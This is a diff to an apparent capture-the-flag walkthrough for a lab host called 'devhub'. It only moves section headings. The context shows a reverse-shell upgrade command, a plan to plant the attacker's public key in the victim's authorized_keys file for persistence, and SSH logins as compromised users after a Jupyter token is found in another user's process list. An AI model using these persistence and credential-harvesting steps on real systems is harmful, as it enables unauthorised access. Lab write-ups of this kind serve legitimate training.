@@ -120,8 +120,6 @@ ctrl-z
 stty raw -echo; fg
 ```
 
-## MCP-Dev -> Analyst
-
 We will now generate SSH keys for the target machine using ssh-keygen before importing our attacker host public key into the authorized keys file:
 
 #### Key generation on victim machine:
@@ -193,6 +191,8 @@ ssh -i /root/.ssh/id_ed25519 mcp-dev@10.129.245.216
 ```
 mcp-dev@devhub:~$ 
 ```
+
+## MCP-Dev -> Analyst
 
 Enumerating the system, we display running processes for the analyst user, which discloses a token for Jupyter notebook on port 8888:
 
@@ -278,3 +278,5 @@ ssh -i /root/.ssh/id_ed25519 analyst@10.129.245.216
 ```
 analyst@devhub:~$
 ```
+
+## Analyst -> Root
